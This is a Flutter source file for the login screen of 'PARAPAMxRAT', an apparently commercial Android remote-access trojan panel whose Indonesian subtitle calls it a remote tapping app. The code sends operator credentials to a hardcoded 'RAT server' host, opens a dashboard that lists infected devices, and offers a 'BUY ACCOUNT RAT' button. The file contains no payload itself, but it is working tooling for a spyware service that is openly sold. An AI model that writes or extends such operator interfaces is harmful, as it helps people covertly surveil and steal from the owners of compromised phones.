import 'package:flutter/material.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

class LoginRatPage extends StatefulWidget {
  const LoginRatPage({super.key});

  @override
  State<LoginRatPage> createState() => _LoginRatPageState();
}

class _LoginRatPageState extends State<LoginRatPage> {
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  bool _isLoading = false;

  Future<void> _processLogin() async {
    setState(() => _isLoading = true);
    try {
      // Endpoint login ke server RAT kamu
      final response = await http.post(
        Uri.parse("http://fourzhost.privateserverr.web.id:3158/api/login"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "email": _emailController.text,
          "password": _passwordController.text,
        }),
      );

      if (response.statusCode == 200) {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('rat_session_email', _emailController.text);
        
        if (mounted) {
          // Masuk ke Dashboard List Device (Foto 1)
          Navigator.pushReplacementNamed(context, '/dashboard_rat');
        }
      } else {
        _showSnack("AKSES DITOLAK: DATABASE TIDAK COCOK");
      }
    } catch (e) {
      _showSnack("GAGAL TERHUBUNG KE SERVER RAT");
    } finally {
      setState(() => _isLoading = false);
    }
  }

  void _showSnack(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F111E), // Background gelap sesuai foto
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: Center(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 30),
          child: Column(
            children: [
              const Text(
                "PARAPAMxRAT",
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 32,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 3,
                ),
              ),
              const Text(
                "APK SADAP JARAK JAUH",
                style: TextStyle(color: Colors.white38, fontSize: 10, letterSpacing: 2),
              ),
              const SizedBox(height: 40),

              Container(
                decoration: BoxDecoration(
                  color: const Color(0xFF1A1D2D), 
                  borderRadius: BorderRadius.circular(35),
                  border: Border.all(color: Colors.white.withOpacity(0.05)),
                ),
                child: Column(
                  children: [
                    ClipRRect(
                      borderRadius: const BorderRadius.vertical(top: Radius.circular(35)),
                      child: Image.asset(
                        'assets/images/bokep.png', // Gambar banner dari foto
                        height: 180,
                        width: double.infinity,
                        fit: BoxFit.cover,
                      ),
                    ),
                    
                    Padding(
                      padding: const EdgeInsets.all(30),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("EMAIL ANDA", style: TextStyle(color: Colors.white70, fontSize: 12, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 10),
                          _buildField(_emailController, "nama@gmail.com", Icons.email_outlined),

                          const SizedBox(height: 25),

                          const Text("KATA SANDI", style: TextStyle(color: Colors.white70, fontSize: 12, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 10),
                          _buildField(_passwordController, "••••••••", Icons.lock_outline, isPass: true),

                          const SizedBox(height: 40),

                          // Tombol MASUK Merah
                          Container(
                            width: double.infinity,
                            height: 60,
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(20),
                              gradient: const LinearGradient(
                                colors: [Color(0xFFFF0040), Color(0xFFD00032)],
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: const Color(0xFFFF0040).withOpacity(0.4),
                                  blurRadius: 15,
                                  offset: const Offset(0, 8),
                                )
                              ],
                            ),
                            child: ElevatedButton(
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.transparent,
                                shadowColor: Colors.transparent,
                                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
                              ),
                              onPressed: _isLoading ? null : _processLogin,
                              child: _isLoading 
                                ? const CircularProgressIndicator(color: Colors.white)
                                : const Text("MASUK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 18)),
                            ),
                          ),
                          
                          const SizedBox(height: 20),
                          Center(
                            child: TextButton(
                              onPressed: () {}, 
                              child: const Text("BUY ACCOUNT RAT", style: TextStyle(color: Color(0xFFFF0040), fontWeight: FontWeight.bold)),
                            ),
                          )
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildField(TextEditingController controller, String hint, IconData icon, {bool isPass = false}) {
    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF121424),
        borderRadius: BorderRadius.circular(15),
      ),
      child: TextField(
        controller: controller,
        obscureText: isPass,
        style: const TextStyle(color: Colors.white),
        decoration: InputDecoration(
          prefixIcon: Icon(icon, color: Colors.white24, size: 20),
          hintText: hint,
          hintStyle: const TextStyle(color: Colors.white10),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(vertical: 20),
        ),
      ),
    );
  }
}